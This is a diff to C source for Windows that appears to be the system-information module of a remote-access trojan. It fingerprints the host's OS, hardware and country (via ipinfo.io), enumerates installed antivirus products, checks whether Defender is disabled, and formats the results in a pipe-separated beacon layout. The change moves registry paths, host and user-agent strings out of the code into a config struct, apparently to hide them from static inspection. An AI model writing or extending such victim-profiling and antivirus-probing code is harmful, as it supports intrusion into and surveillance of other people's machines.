@@ -3,6 +3,7 @@
 #include <winhttp.h>
 #include <stdio.h>
 #include <psapi.h>
+#include "utils.h"
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "psapi.lib")
@@ -26,11 +27,11 @@ static char* reg_read_sz(HKEY key, const char* subkey, const char* value) {
 }
 
 static char* get_win_version() {
-    const char* key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
-    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, key, "ProductName");
-    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, key, "CurrentBuild");
-    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, key, "DisplayVersion");
-    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, key, "ReleaseId");
+    const char* key = g_conf.s_reg_win_key;
+    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, key, g_conf.s_reg_prod_name);
+    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, key, g_conf.s_reg_build);
+    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, key, g_conf.s_reg_display);
+    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, key, g_conf.s_reg_release);
 
     char* result = (char*)malloc(256);
     sprintf(result, "%s %s (Build %s)",
@@ -44,45 +45,48 @@ static char* get_win_version() {
 }
 
 static char* get_antivirus() {
-    const char* av_paths[][2] = {
-        {"SOFTWARE\\AVAST Software\\Avast",  "Avast"},
-        {"SOFTWARE\\AVG\\Antivirus",          "AVG"},
-        {"SOFTWARE\\Bitdefender",             "Bitdefender"},
-        {"SOFTWARE\\KasperskyLab",            "Kaspersky"},
-        {"SOFTWARE\\McAfee",                  "McAfee"},
-        {"SOFTWARE\\Norton",                  "Norton"},
-        {"SOFTWARE\\ESET",                    "ESET"},
-        {"SOFTWARE\\Trend Micro",             "Trend Micro"},
-        {"SOFTWARE\\Malwarebytes",            "Malwarebytes"},
-        {NULL, NULL}
+    const char* av_list[] = {"Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "ESET", "Trend Micro", "Malwarebytes", NULL};
+    const char* av_keys[] = {
+        "SOFTWARE\\AVAST Software\\Avast",
+        "SOFTWARE\\AVG\\Antivirus",
+        "SOFTWARE\\Bitdefender",
+        "SOFTWARE\\KasperskyLab",
+        "SOFTWARE\\McAfee",
+        "SOFTWARE\\Norton",
+        "SOFTWARE\\ESET",
+        "SOFTWARE\\Trend Micro",
+        "SOFTWARE\\Malwarebytes",
+        NULL
     };
-    for (int i = 0; av_paths[i][0] != NULL; i++) {
+
+    for (int i = 0; av_keys[i] != NULL; i++) {
         HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, av_paths[i][0], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, av_keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
-            return _strdup(av_paths[i][1]);
+            return _strdup(av_list[i]);
         }
     }
-    char* disabled = reg_read_sz(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware");
+
+    char* disabled = reg_read_sz(HKEY_LOCAL_MACHINE, g_conf.s_reg_defender_key, g_conf.s_reg_dis_spy);
     if (disabled && strcmp(disabled, "1") == 0) { free(disabled); return _strdup("Unknown"); }
     if (disabled) free(disabled);
     return _strdup("Windows Defender");
 }
 
 static char* get_country() {
-    HINTERNET hSession = WinHttpOpen(L"client/1.0",
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    WCHAR ua[64], host[64], path[64];
+    MultiByteToWideChar(CP_ACP, 0, g_conf.s_http_ua, -1, ua, 64);
+    MultiByteToWideChar(CP_ACP, 0, g_conf.s_http_host, -1, host, 64);
+    MultiByteToWideChar(CP_ACP, 0, g_conf.s_http_path, -1, path, 64);
+
+    HINTERNET hSession = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return _strdup("??");
-    HINTERNET hConnect = WinHttpConnect(hSession, L"ipinfo.io", INTERNET_DEFAULT_HTTP_PORT, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return _strdup("??"); }
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/country", NULL,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup("??"); }
 
-    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
-        WinHttpReceiveResponse(hRequest, NULL)) {
+    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
         DWORD size = 0;
         WinHttpQueryDataAvailable(hRequest, &size);
         if (size > 0) {
@@ -101,19 +105,17 @@ static char* get_country() {
 }
 
 static char* get_gpu() {
-    char* gpu = reg_read_sz(HKEY_LOCAL_MACHINE,
-        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
-        "DriverDesc");
-    if (!gpu) gpu = reg_read_sz(HKEY_LOCAL_MACHINE,
-        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0001",
-        "DriverDesc");
+    char* gpu = reg_read_sz(HKEY_LOCAL_MACHINE, g_conf.s_reg_gpu_key, g_conf.s_reg_gpu_desc);
+    if (!gpu) {
+        char alt_key[256];
+        sprintf(alt_key, "%s\\0001", g_conf.s_reg_gpu_key);
+        gpu = reg_read_sz(HKEY_LOCAL_MACHINE, alt_key, g_conf.s_reg_gpu_desc);
+    }
     return gpu ? gpu : _strdup("Unknown GPU");
 }
 
 static char* get_cpu() {
-    char* cpu = reg_read_sz(HKEY_LOCAL_MACHINE,
-        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
-        "ProcessorNameString");
+    char* cpu = reg_read_sz(HKEY_LOCAL_MACHINE, g_conf.s_reg_cpu_key, g_conf.s_reg_cpu_name);
     if (cpu) {
         char* p = cpu;
         while (*p == ' ') p++;
@@ -132,8 +134,7 @@ static char* get_ram() {
     ULONGLONG freeMB  = ms.ullAvailPhys  / (1024ULL * 1024ULL);
     char* buf = (char*)malloc(64);
     if (totalMB >= 1024)
-        sprintf(buf, "%.1f GB free / %.1f GB total",
-            (double)freeMB / 1024.0, (double)totalMB / 1024.0);
+        sprintf(buf, "%.1f GB free / %.1f GB total", (double)freeMB / 1024.0, (double)totalMB / 1024.0);
     else
         sprintf(buf, "%llu MB free / %llu MB total", freeMB, totalMB);
     return buf;
@@ -157,7 +158,6 @@ static char* get_process_name() {
     return _strdup(last ? last + 1 : path);
 }
 
-/* Protocol: WinVersion|DesktopName|AntiVirus|Country|GPU|CPU|RAM|Disk|ProcessName */
 char* collect_sysinfo() {
     char* win     = get_win_version();
     char  computer[MAX_COMPUTERNAME_LENGTH + 1];
